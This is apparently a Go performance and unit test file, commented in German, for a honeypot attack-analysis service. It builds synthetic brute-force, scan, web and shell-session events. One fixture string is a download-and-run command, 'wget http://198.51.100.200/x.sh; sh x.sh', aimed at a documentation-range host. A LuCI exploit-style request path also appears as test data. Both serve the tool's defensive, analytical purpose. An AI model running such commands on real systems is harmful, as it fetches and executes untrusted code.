package main

// Zeitmessung der teuren Auswertungen mit einer Woche Testdaten (nur Dokumentationsadressen).
// Läuft nur mit HIVE_PERF=1, weil das Füllen der Datenbank etwas dauert:
//
//	HIVE_PERF=1 go test -run TestPerfEndpoints -v .
//
// Gemessen werden der volle Aufbau des Angriffs-Schnappschusses (attacksnap.go), eine
// inkrementelle Aktualisierung und je Endpunkt zwei Aufrufe.

import (
	"encoding/json"
	"fmt"
	"net/http/httptest"
	"os"
	"runtime"
	"testing"
	"time"
)

func perfEvents(now time.Time) []*Event {
	var out []*Event
	add := func(e *Event, data map[string]any) {
		if data != nil {
			e.Data, _ = json.Marshal(data)
		}
		out = append(out, e)
	}
	start := now.Add(-7 * 24 * time.Hour)
	// 40 Dauer-Brute-Forcer mit je 1.300 Versuchen über gut zwei Stunden
	for b := range 40 {
		ip := fmt.Sprintf("198.51.100.%d", b+1)
		t0 := start.Add(time.Duration(b) * 4 * time.Hour)
		for i := range 1300 {
			ts := t0.Add(time.Duration(i) * 6 * time.Second)
			sess := fmt.Sprintf("bf%d-%d", b, i)
			add(&Event{TS: ts, Type: "connect", Service: "ssh", SrcIP: ip, DstPort: 22, Session: sess}, nil)
			add(&Event{TS: ts.Add(time.Second), Type: "login", Service: "ssh", SrcIP: ip, DstPort: 22, Session: sess,
				Username: "root", Password: fmt.Sprintf("pw%04d", i)}, map[string]any{"client": "SSH-2.0-Go", "hassh": "0a1b2c3d4e5f60718293a4b5c6d7e8f9"})
			add(&Event{TS: ts.Add(2 * time.Second), Type: "disconnect", Service: "ssh", SrcIP: ip, DstPort: 22, Session: sess}, nil)
		}
	}
	// 6.000 Scanner mit je drei Ports
	for s := range 6000 {
		ip := fmt.Sprintf("203.0.%d.%d", 113+s/250%2, s%250+1)
		ts := start.Add(time.Duration(s) * 100 * time.Second)
		for p, port := range []int{22, 80, 6379} {
			add(&Event{TS: ts.Add(time.Duration(p) * time.Second), Type: "connect", Service: "raw", SrcIP: ip, DstPort: port}, nil)
		}
	}
	// 8.000 Web-Anfragen
	for r := range 8000 {
		ip := fmt.Sprintf("192.0.2.%d", r%250+1)
		add(&Event{TS: start.Add(time.Duration(r) * 75 * time.Second), Type: "request", Service: "http", SrcIP: ip, DstPort: 80},
			map[string]any{"method": "GET", "path": fmt.Sprintf("/cgi-bin/luci/;stok=/locale?form=country&x=%d", r%40), "user_agent": "Mozilla/5.0 zgrab/0.x", "headers": "Accept: */*"})
	}
	// 600 Sitzungen mit Befehlen
	for c := range 600 {
		ip := fmt.Sprintf("203.0.113.%d", c%200+1)
		ts := start.Add(time.Duration(c) * 1000 * time.Second)
		sess := fmt.Sprintf("cmd%d", c)
		add(&Event{TS: ts, Type: "login", Service: "ssh", SrcIP: ip, DstPort: 22, Session: sess, Username: "root", Password: "admin"}, map[string]any{"success": true})
		for i, cmd := range []string{"uname -s -v -n -r -m", fmt.Sprintf("echo check_%032x_small_control", c), "cd /tmp; wget http://198.51.100.200/x.sh; sh x.sh", "cat /proc/cpuinfo"} {
			add(&Event{TS: ts.Add(time.Duration(i+1) * time.Second), Type: "command", Service: "ssh", SrcIP: ip, DstPort: 22, Session: sess}, map[string]any{"input": cmd})
		}
	}
	return out
}

func TestPerfEndpoints(t *testing.T) {
	if os.Getenv("HIVE_PERF") == "" {
		t.Skip("nur mit HIVE_PERF=1")
	}
	h := testHive(t)
	w, err := NewWriter(h.st, func(*Event) {})
	if err != nil {
		t.Fatal(err)
	}
	h.writer = w
	go w.Run()
	evs := perfEvents(time.Now())
	for _, e := range evs {
		for !w.Submit(e) {
			time.Sleep(5 * time.Millisecond)
		}
	}
	w.Stop(2 * time.Minute)
	var n int
	h.st.db.QueryRow(`SELECT COUNT(*) FROM events`).Scan(&n)
	t.Logf("%d Ereignisse eingeliefert, %d gespeichert (Rest verdichtet)", len(evs), n)
	resetAnalysisCache() // wie nach einem Neustart
	t0 := time.Now()
	h.refreshSnap(t.Context())
	t.Logf("%-36s %6d ms (%d Angriffe)", "Schnappschuss voll (Hintergrund)", time.Since(t0).Milliseconds(), len(h.snap.list))
	// Ein Dauer-Brute-Forcer liefert 1.300 neue Ereignisse: nur seine Angriffe neu aufbauen
	w2, _ := NewWriter(h.st, func(*Event) {})
	go w2.Run()
	for i := range 1300 {
		w2.Submit(&Event{TS: time.Now().Add(-time.Duration(1300-i) * time.Second), Type: "login", Service: "ssh", SrcIP: "198.51.100.1", DstPort: 22,
			Username: "root", Password: fmt.Sprintf("neu%04d", i)})
	}
	w2.Stop(time.Minute)
	h.snap.mu.Lock()
	h.snap.checkAt = time.Time{}
	h.snap.mu.Unlock()
	t0 = time.Now()
	h.refreshSnap(t.Context())
	t.Logf("%-36s %6d ms", "Schnappschuss inkrementell (1 IP)", time.Since(t0).Milliseconds())
	for _, ep := range []struct {
		path string
		fn   func(*httptest.ResponseRecorder, string)
	}{
		{"/api/insights?range=7d", func(rec *httptest.ResponseRecorder, p string) { h.insights(rec, httptest.NewRequest("GET", p, nil)) }},
		{"/api/campaigns?range=7d", func(rec *httptest.ResponseRecorder, p string) { h.campaigns(rec, httptest.NewRequest("GET", p, nil)) }},
		{"/api/analysis/exploits?range=7d", func(rec *httptest.ResponseRecorder, p string) { h.exploitsAPI(rec, httptest.NewRequest("GET", p, nil)) }},
		{"/api/attacks?range=24h", func(rec *httptest.ResponseRecorder, p string) { h.attacks(rec, httptest.NewRequest("GET", p, nil)) }},
	} {
		h.insightsC.mu.Lock()
		h.insightsC.key = "" // Ergebnis-Zwischenspeicher der Erkenntnisse leeren: Rechenzeit messen
		h.insightsC.mu.Unlock()
		for _, run := range []string{"erster", "zweiter"} {
			rec := httptest.NewRecorder()
			t0 := time.Now()
			ep.fn(rec, ep.path)
			t.Logf("%-36s %s: %6d ms (HTTP %d, %d Bytes)", ep.path, run, time.Since(t0).Milliseconds(), rec.Code, rec.Body.Len())
		}
	}
	var m1, m2 runtime.MemStats
	runtime.GC()
	runtime.ReadMemStats(&m1)
	h.snap.mu.Lock()
	h.snap.list = nil
	h.snap.mu.Unlock()
	runtime.GC()
	runtime.ReadMemStats(&m2)
	t.Logf("%-36s %6.1f MB", "Speicher des Schnappschusses", float64(int64(m1.HeapAlloc)-int64(m2.HeapAlloc))/(1<<20))
}

// Inkrementell: neue Ereignisse einer IP bauen nur deren Angriffe neu auf.
func TestAttackSnapIncremental(t *testing.T) {
	h := testHive(t)
	w, err := NewWriter(h.st, func(*Event) {})
	if err != nil {
		t.Fatal(err)
	}
	go w.Run()
	now := time.Now()
	for i := range 20 {
		w.Submit(&Event{TS: now.Add(-time.Duration(i) * time.Hour), Type: "connect", Service: "ssh", SrcIP: fmt.Sprintf("198.51.100.%d", i+1), DstPort: 22})
	}
	w.Stop(time.Minute)
	list, _, err := h.attacksSince(t.Context(), now.Add(-24*time.Hour))
	if err != nil || len(list) != 20 {
		t.Fatalf("voll: %d %v", len(list), err)
	}
	before := list[len(list)-1] // ältester Angriff, IP .20
	w2, _ := NewWriter(h.st, func(*Event) {})
	go w2.Run()
	d, _ := json.Marshal(map[string]any{"input": "uname -a"})
	w2.Submit(&Event{TS: now, Type: "command", Service: "ssh", SrcIP: "198.51.100.1", DstPort: 22, Data: d})
	w2.Submit(&Event{TS: now, Type: "connect", Service: "ssh", SrcIP: "198.51.100.77", DstPort: 22})
	w2.Stop(time.Minute)
	h.snap.mu.Lock()
	h.snap.checkAt = time.Time{} // nicht 20 Sekunden warten
	h.snap.mu.Unlock()
	list, _, _ = h.attacksSince(t.Context(), now.Add(-24*time.Hour))
	if len(list) != 21 {
		t.Fatalf("nach neuen Ereignissen: %d", len(list))
	}
	var one *Attack
	for _, a := range list {
		if a.IP == "198.51.100.1" {
			one = a
		}
		if a.IP == before.IP && a != before {
			t.Error("unveränderte IP neu aufgebaut")
		}
	}
	if one == nil || len(one.Commands) != 1 {
		t.Fatalf("IP mit neuem Befehl nicht aktualisiert: %+v", one)
	}
	// Bereich: nur Angriffe mit Aktivität ab since
	if l, _, _ := h.attacksSince(t.Context(), now.Add(-90*time.Minute)); len(l) != 3 {
		t.Errorf("letzte 90 Minuten: %d", len(l))
	}
}
